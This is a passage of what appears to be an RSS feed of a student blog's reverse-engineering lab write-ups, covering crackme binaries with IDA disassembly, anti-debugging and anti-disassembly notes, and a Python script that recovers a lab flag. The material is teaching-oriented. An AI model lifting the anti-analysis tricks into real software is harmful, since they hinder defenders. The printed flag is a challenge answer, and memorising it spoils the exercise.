&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> printf(&lt;span style="color:#e6db74">&amp;#34;Usage: %s &amp;lt;input&amp;gt;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, &lt;span style="color:#f92672">*&lt;/span>argv);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">1LL&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p></description></item><item><title>Simple Reverse - 0x29(2023 Lab - Unpackme)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x292023-lab---unpackme/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x292023-lab---unpackme/</guid><description>&lt;h1 id="simple-reverse---0x292023-lab---unpackme">
 Simple Reverse - 0x29(2023 Lab - Unpackme)
 &lt;a class="anchor" href="#simple-reverse---0x292023-lab---unpackme">#&lt;/a>
&lt;/h1>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LOAD:&lt;span style="color:#ae81ff">0000000000005&lt;/span>AE8 mov rdi, [rsp&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">18&lt;/span>h&lt;span style="color:#f92672">+&lt;/span>start] ; start
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LOAD:&lt;span style="color:#ae81ff">0000000000005&lt;/span>AED push &lt;span style="color:#ae81ff">5&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LOAD:&lt;span style="color:#ae81ff">0000000000005&lt;/span>AEF pop rdx ; prot
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LOAD:&lt;span style="color:#ae81ff">0000000000005&lt;/span>AF0 push &lt;span style="color:#ae81ff">0&lt;/span>Ah
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LOAD:&lt;span style="color:#ae81ff">0000000000005&lt;/span>AF2 pop rax
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LOAD:&lt;span style="color:#ae81ff">0000000000005&lt;/span>AF3 syscall ; LINUX &lt;span style="color:#f92672">-&lt;/span> sys_mprotect
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LOAD:&lt;span style="color:#ae81ff">0000000000005&lt;/span>AF5 jmp r13
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LOAD:&lt;span style="color:#ae81ff">0000000000005&lt;/span>AF5
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LOAD:&lt;span style="color:#ae81ff">0000000000005&lt;/span>AF5 sub_5A7C endp
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LOAD:&lt;span style="color:#ae81ff">0000000000005&lt;/span>AF5
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LOAD:&lt;span style="color:#ae81ff">0000000000005&lt;/span>AF8 ; &lt;span style="color:#f92672">---------------------------------------------------------------------------&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LOAD:&lt;span style="color:#ae81ff">0000000000005&lt;/span>AF8
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LOAD:&lt;span style="color:#ae81ff">0000000000005&lt;/span>AF8 loc_5AF8: ; CODE XREF: start&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">↑&lt;/span>p
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LOAD:&lt;span style="color:#ae81ff">0000000000005&lt;/span>AF8 pop rbp
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LOAD:&lt;span style="color:#ae81ff">0000000000005&lt;/span>AF9 call sub_5A7C
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LOAD:&lt;span style="color:#ae81ff">0000000000005&lt;/span>AF9
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LOAD:&lt;span style="color:#ae81ff">0000000000005&lt;/span>AF9 ; &lt;span style="color:#f92672">---------------------------------------------------------------------------&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LOAD:&lt;span style="color:#ae81ff">0000000000005&lt;/span>AFE aProcSelfExe db &lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span>&lt;span style="color:#f92672">/&lt;/span>proc&lt;span style="color:#f92672">/&lt;/span>self&lt;span style="color:#f92672">/&lt;/span>exe&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span>,&lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LOAD:&lt;span style="color:#ae81ff">0000000000005&lt;/span>B0D align &lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LOAD:&lt;span style="color:#ae81ff">0000000000005&lt;/span>B0E dw &lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LOAD:&lt;span style="color:#ae81ff">0000000000005&lt;/span>B10 dq &lt;span style="color:#ae81ff">81&lt;/span>B00000C1100h, &lt;span style="color:#ae81ff">0FF&lt;/span>FFFF0000000200h, &lt;span style="color:#ae81ff">7549F&lt;/span>&lt;span style="color:#ae81ff">983004&lt;/span>AE8E5h, &lt;span style="color:#ae81ff">0F&lt;/span>D374C8D48575344h, &lt;span style="color:#ae81ff">0&lt;/span>CE39482FEB5B565Eh, &lt;span style="color:#ae81ff">0FF&lt;/span>FFFBFF5E563273h
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LOAD:&lt;span style="color:#ae81ff">0000000000005&lt;/span>B10 dq &lt;span style="color:#ae81ff">778F&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>C0A72803CACh, &lt;span style="color:#ae81ff">2&lt;/span>C06740FFE7E8006h, &lt;span style="color:#ae81ff">56161&lt;/span>BE477013CE8h, &lt;span style="color:#ae81ff">0FF&lt;/span>BFFFFF75D028ADh, &lt;span style="color:#ae81ff">0&lt;/span>D801F829C80F5FDFh, &lt;span style="color:#ae81ff">0&lt;/span>C35BDFEBAC0312ABh
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LOAD:&lt;span style="color:#ae81ff">0000000000005&lt;/span>B10 dq &lt;span style="color:#ae81ff">8948505741564158&lt;/span>h, &lt;span style="color:#ae81ff">0&lt;/span>DBFFEDFEEC8148E6h, &lt;span style="color:#ae81ff">590&lt;/span>A6A5F54591000h, &lt;span style="color:#ae81ff">5003E8348&lt;/span>A548F3h, &lt;span style="color:#ae81ff">0&lt;/span>B6AB48FE8949F875h, &lt;span style="color:#ae81ff">0F&lt;/span>&lt;span style="color:#ae81ff">60&lt;/span>C0AFC0CCBB374h
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LOAD:&lt;span style="color:#ae81ff">0000000000005&lt;/span>B10 dq &lt;span style="color:#ae81ff">4&lt;/span>DF5FF6EDFFE02FFh, &lt;span style="color:#ae81ff">5E57370&lt;/span>FFFBAFC29h, &lt;span style="color:#ae81ff">50F&lt;/span>&lt;span style="color:#ae81ff">58596&lt;/span>AED7B8Ch, &lt;span style="color:#ae81ff">0&lt;/span>DFFF6FDB0579C085h, &lt;span style="color:#ae81ff">8&lt;/span>D49FD91580F6A0Eh, &lt;span style="color:#ae81ff">0E741&lt;/span>AAA00B0FF7Dh
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>...
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::spoiler Real File main Function&lt;/p></description></item><item><title>Simple Reverse - 0x30(2023 HW - Evil FlagChecker)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x302023-hw---evil-flagchecker/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x302023-hw---evil-flagchecker/</guid><description>&lt;h1 id="simple-reverse---0x302023-hw---evil-flagchecker">
 Simple Reverse - 0x30(2023 HW - Evil FlagChecker)
 &lt;a class="anchor" href="#simple-reverse---0x302023-hw---evil-flagchecker">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>Anti Disassembly - 這一部分可以看一下碩一修的malware reverse的anti disassembly的修復(就是d和c的交錯使用)
Anti Debugging - 首推scylla hide&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler IDA main&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#66d9ef">__cdecl&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> argc, &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>argv, &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>envp)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DWORD TickCount; &lt;span style="color:#75715e">// [esp+0h] [ebp-14h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> v5; &lt;span style="color:#75715e">// [esp+8h] [ebp-Ch]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> TickCount &lt;span style="color:#f92672">=&lt;/span> GetTickCount();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Sleep(&lt;span style="color:#ae81ff">120000u&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v5 &lt;span style="color:#f92672">=&lt;/span> GetTickCount() &lt;span style="color:#f92672">-&lt;/span> TickCount;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( v5 &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">119950&lt;/span> &lt;span style="color:#f92672">||&lt;/span> v5 &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">120050&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ExitProcess(&lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ((&lt;span style="color:#66d9ef">void&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>)(&lt;span style="color:#66d9ef">void&lt;/span>))loc_401AE0)();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::
:::spoiler IDA loc_401AE0&lt;/p>
&lt;pre tabindex="0">&lt;code>.text:00401AE0 loc_401AE0: ; CODE XREF: _main:loc_4014AB↑p
.text:00401AE0 push ebp
.text:00401AE1 mov ebp, esp
.text:00401AE3 lea esi, aHelloHacker ; &amp;#34;Hello Hacker&amp;#34;
.text:00401AE9 mov al, 48h ; &amp;#39;H&amp;#39;
.text:00401AEB cmp [esi], al
.text:00401AED jz short loc_401AF0
.text:00401AED
.text:00401AED ; ---------------------------------------------------------------------------
.text:00401AEF db 0E8h
.text:00401AF0 ; ---------------------------------------------------------------------------
.text:00401AF0
.text:00401AF0 loc_401AF0: ; CODE XREF: .text:00401AED↑j
.text:00401AF0 nop word ptr [eax+eax+00000000h]
.text:00401AF9 jmp short loc_401B01
.text:00401AF9
.text:00401AF9 ; ---------------------------------------------------------------------------
.text:00401AFB db 48h ; H
.text:00401AFC db 65h ; e
.text:00401AFD db 6Ch ; l
.text:00401AFE db 6Ch ; l
.text:00401AFF db 6Fh ; o
.text:00401B00 db 0
.text:00401B01 ; ---------------------------------------------------------------------------
.text:00401B01
.text:00401B01 loc_401B01: ; CODE XREF: .text:00401AF9↑j
.text:00401B01 jmp short loc_401B0E
.text:00401B01
.text:00401B01 ; ---------------------------------------------------------------------------
.text:00401B03 db 0E8h
.text:00401B04 db 66h ; f
.text:00401B05 db 0Fh
.text:00401B06 db 1Fh
.text:00401B07 db 84h
.text:00401B08 db 0
.text:00401B09 db 0
.text:00401B0A db 0
.text:00401B0B db 0
.text:00401B0C byte_401B0C db 0
.text:00401B0D db 0E8h
.text:00401B0E ; ---------------------------------------------------------------------------
.text:00401B0E
.text:00401B0E loc_401B0E: ; CODE XREF: .text:loc_401B01↑j
.text:00401B0E jz short loc_401B13
.text:00401B0E
.text:00401B10 jnz short loc_401B13
.text:00401B10
.text:00401B10 ; ---------------------------------------------------------------------------
.text:00401B12 db 0E8h
.text:00401B13 ; ---------------------------------------------------------------------------
.text:00401B13
.text:00401B13 loc_401B13: ; CODE XREF: .text:loc_401B0E↑j
.text:00401B13 ; .text:00401B10↑j
.text:00401B13 push 1
.text:00401B15 jmp sub_401220
&lt;/code>&lt;/pre>&lt;p>:::
:::spoiler IDA notify_debugger&lt;/p></description></item><item><title>Simple Reverse 0x06(Lab - AMessageBox)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x06lab---amessagebox/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x06lab---amessagebox/</guid><description>&lt;h1 id="simple-reverse-0x06lab---amessagebox">
 Simple Reverse 0x06(Lab - AMessageBox)
 &lt;a class="anchor" href="#simple-reverse-0x06lab---amessagebox">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://www.796t.com/content/1550025925.html">組合語言ROL和RCL的區別&lt;/a>&lt;/p>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>這一題其實以逆向的角度來說很簡單&lt;/p>
&lt;ol>
&lt;li>先用DIE看一些資訊
&lt;img src="https://hackmd.io/_uploads/BkFoZ06u3.png" alt="" />
發現有加UPX的殼，這件事情可以透過IDA更加確定
&lt;img src="https://hackmd.io/_uploads/ryG0-Aau3.png" alt="" />
可以看到Function Name只有start然後反組譯的地方看起來很噁心，那應該就是在拆殼的步驟&lt;/li>
&lt;li>先執行看看
&lt;img src="https://hackmd.io/_uploads/HktlXCaun.png" alt="" />
需要輸入flag然後用一個message box噴錯&lt;/li>
&lt;li>用x64-dbg
透過TA的講解，可以知道這一題不需要解殼，只需要用動態debugger看一下就可以了
&lt;ol>
&lt;li>我們知道題目有使用到message box的API，所以我們可以先鎖定該API在哪邊呼叫，再往回trace出他的判斷
我們可以利用符號的視窗看到這支程式有用到那些API Module(.dll)，而message box的API是在&lt;code>user32.dll&lt;/code>，用下面的搜尋可以縮小範圍，但這個多種類的messagebox，具體來說是用哪一個也不知道，所以可以全選後都設立中斷點
&lt;img src="https://hackmd.io/_uploads/S18CNR6_h.png" alt="" />&lt;/li>
&lt;li>剩下的就是跟一般debugger差不多的操作，當追到call messagebox之前的break point時，可以看一下call stack(呼叫堆疊)往前trace是誰呼叫了API，發現是&lt;code>00C7110B&lt;/code>，點進去看一下可以明顯看到Correct/Wrong的字樣，所以可以判斷應該是這一段程式在判斷我們輸入的東西
&lt;img src="https://hackmd.io/_uploads/r1E7LAad3.png" alt="" />
&lt;img src="https://hackmd.io/_uploads/Syt_8Cadh.png" alt="" />
&lt;img src="https://hackmd.io/_uploads/BkixvRTOn.png" alt="" />&lt;/li>
&lt;li>分析判斷的程式
這裡就是要考驗耐心和不斷的觀察register的變化，認真看大概花個半小時就可以知道這一段在幹嘛(我就菜QAQ)
&lt;img src="https://hackmd.io/_uploads/S10aORTd2.png" alt="" />&lt;/li>
&lt;li>結論是中間的那些==重要的操作==其實就是左旋轉+XOR &lt;code>0x87&lt;/code>這樣而已，所以我們就可以開寫腳本了，把東西反著作回去就好了&lt;/li>
&lt;/ol>
&lt;/li>
&lt;/ol>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">import binascii

enc_flag = [0xB5, 0xE5, 0x8D, 0xBD, 0x5C, 0x46, 0x36, 0x4E, 0x4E, 0x1E, 0x0E, 0x26, 0xA4, 0x1E, 0x0E, 0x4E, 0x46, 0x06, 0x16, 0xAC, 0xB4, 0x3E, 0x4E, 0x16, 0x94, 0x3E, 0x94, 0x8C, 0x94, 0x8C, 0x9C, 0x4E, 0xA4, 0x8C, 0x2E, 0x46, 0x8C, 0x6C]

def pad(m):
 length = 0
 if len(m) % 8 != 0:
 length = 8-len(m) % 8
 return &amp;#39;0&amp;#39; * length + m

FLAG = []
for i in range(len(enc_flag)):
 enc_flag[i] ^= 0x87
 tmp = pad(bin(enc_flag[i])[2:])
 tmp = hex(int(tmp[-3:] + tmp[:-3], 2))
 FLAG.append(binascii.unhexlify(tmp[2:]).decode())

print(&amp;#34;&amp;#34;.join(FLAG))
&lt;/code>&lt;/pre>&lt;p>Flag: &lt;code>FLAG{8699314d319802ef792b7babac9da58a}&lt;/code>&lt;/p></description></item><item><title>Simple Reverse 0x08(Lab - GetProcAddress)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x08lab---getprocaddress/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x08lab---getprocaddress/</guid><description>&lt;h1 id="simple-reverse-0x08lab---getprocaddress">
 Simple Reverse 0x08(Lab - GetProcAddress)
 &lt;a class="anchor" href="#simple-reverse-0x08lab---getprocaddress">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulefilenamea?ns-enrollment-type=Collection&amp;amp;ns-enrollment-id=rdg3b1j45ye486">GetModuleFileNameA 函式&lt;/a>
&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/fileapi/nf-fileapi-createfilea">createFileA 函式&lt;/a>
&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/fileapi/nf-fileapi-setfilepointer?ns-enrollment-type=Collection&amp;amp;ns-enrollment-id=rdg3b1j45ye486">setFilePointer 函式&lt;/a>
&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/fileapi/nf-fileapi-readfile">ReadFile 函式&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler IDA main function&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp!" data-lang="cpp!">int __cdecl main(int argc, const char **argv, const char **envp)
{
 char *v3; // rdi
 __int64 i; // rcx
 char v6[32]; // [rsp+0h] [rbp-40h] BYREF
 char v7; // [rsp+40h] [rbp+0h] BYREF
 char lpFilename[304]; // [rsp+50h] [rbp+10h] BYREF
 char lpBuffer[136]; // [rsp+180h] [rbp+140h] BYREF
 char flag[64]; // [rsp+208h] [rbp+1C8h] BYREF
 __int64 File_HANDLE_VALUE; // [rsp+248h] [rbp+208h]
 int j; // [rsp+264h] [rbp+224h]

 v3 = &amp;amp;v7;
 for ( i = 146i64; i; --i )
 {
 *v3 = 0xCCCCCCCC;
 v3 += 4;
 }
 sub_140011375(&amp;amp;unk_1400230B5);
 sub_1400113AC();
 printf(&amp;#34;Give me flag: &amp;#34;);
 scanf(&amp;#34;%39s&amp;#34;, flag);
 (GetModuleFileNameA_0)(0i64, lpFilename, 260i64);
 File_HANDLE_VALUE = (CreateFileA)(
 lpFilename,
 0x80000000i64,
 FILE_SHARE_READ,
 0i64,
 OPEN_EXISTING,
 FILE_ATTRIBUTE_NORMAL,
 0i64);
 if ( File_HANDLE_VALUE == -1
 || ((SetFilePointer)(File_HANDLE_VALUE, 0x4Ei64, 0i64, FILE_BEGIN),
 !(ReadFile)(File_HANDLE_VALUE, lpBuffer, 39i64, 0i64, 0i64)) )
 {
LABEL_11:
 puts(&amp;#34;Wrong...&amp;#34;);
 }
 else
 {
 for ( j = 0; j &amp;lt; 39; ++j )
 {
 if ( (flag[j] ^ lpBuffer[j]) != byte_14001E000[8 * j] )
 goto LABEL_11;
 }
 puts(&amp;#34;Correct!!!&amp;#34;);
 }
 sub_140011311(v6, &amp;amp;unk_14001BB18);
 return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Reverse 0x11(Lab - Exception)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x11lab---exception/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x11lab---exception/</guid><description>&lt;h1 id="simple-reverse-0x11lab---exception">
 Simple Reverse 0x11(Lab - Exception)
 &lt;a class="anchor" href="#simple-reverse-0x11lab---exception">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://mycollegenotebook.medium.com/%E4%B9%98%E6%B3%95-%E9%99%A4%E6%B3%95%E7%9A%84%E9%81%8B%E7%94%A8-%E7%B5%84%E5%90%88%E8%AA%9E%E8%A8%80%E7%AD%86%E8%A8%98-638b1eac4696">乘法、除法的運用 — 組合語言筆記&lt;/a>
&lt;a href="https://learn.microsoft.com/zh-tw/cpp/cpp/try-except-statement?view=msvc-170&amp;amp;viewFallbackFrom=msvc-170%3Fns-enrollment-type%3DCollection&amp;amp;ns-enrollment-id=rdg3b1j45ye486">try-except 陳述式&lt;/a>&lt;/p>
&lt;blockquote>
&lt;ul>
&lt;li>EXCEPTION_CONTINUE_EXECUTION (-1) 例外狀況已關閉。 在例外狀況發生的位置繼續執行。&lt;/li>
&lt;li>EXCEPTION_CONTINUE_SEARCH 無法辨識 (0) 例外狀況。 繼續搜尋處理常式的堆疊，先搜尋包含 try-except 語句，然後針對具有下一個最高優先順序的處理常式。&lt;/li>
&lt;li>EXCEPTION_EXECUTE_HANDLER 辨識 (1) 例外狀況。 藉由執行 __except 複合陳述式將控制權傳送至例外狀況處理常式，然後在 區塊之後 __except 繼續執行。&lt;/li>
&lt;/ul>&lt;/blockquote>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler IDA Psuedo Code&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#66d9ef">__cdecl&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> argc, &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>argv, &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>envp)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">char&lt;/span> Str[&lt;span style="color:#ae81ff">112&lt;/span>]; &lt;span style="color:#75715e">// [rsp+20h] [rbp+0h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> i; &lt;span style="color:#75715e">// [rsp+A0h] [rbp+80h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> printf(&lt;span style="color:#e6db74">&amp;#34;Give me flag: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> scanf(&lt;span style="color:#e6db74">&amp;#34;%s&amp;#34;&lt;/span>, Str);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( strlen(Str) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">38&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> ( i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; i &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">38&lt;/span>; &lt;span style="color:#f92672">++&lt;/span>i )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( Str[i] &lt;span style="color:#f92672">!=&lt;/span> byte_14000A000[i] )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">goto&lt;/span> LABEL_7;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34;Correct :&amp;gt;&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LABEL_7:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34;Wrong :&amp;lt;&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p></description></item><item><title>Simple Reverse 0x12(Lab - TLSCallback)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x12lab---tlscallback/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x12lab---tlscallback/</guid><description>&lt;h1 id="simple-reverse-0x12lab---tlscallback">
 Simple Reverse 0x12(Lab - TLSCallback)
 &lt;a class="anchor" href="#simple-reverse-0x12lab---tlscallback">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://www.youtube.com/live/4-hgyiCV3ZA?feature=share&amp;amp;t=6624">課程相關影片&lt;/a>
&lt;a href="https://medium.com/@racktar7743/c%e8%aa%9e%e8%a8%80-function-pointer%e7%9a%84%e6%87%89%e7%94%a8-%e5%9b%9b-function-pointer-array-d0d624db8406">[C語言] function pointer的應用[四]: function pointer array&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler IDA main function&lt;/p>
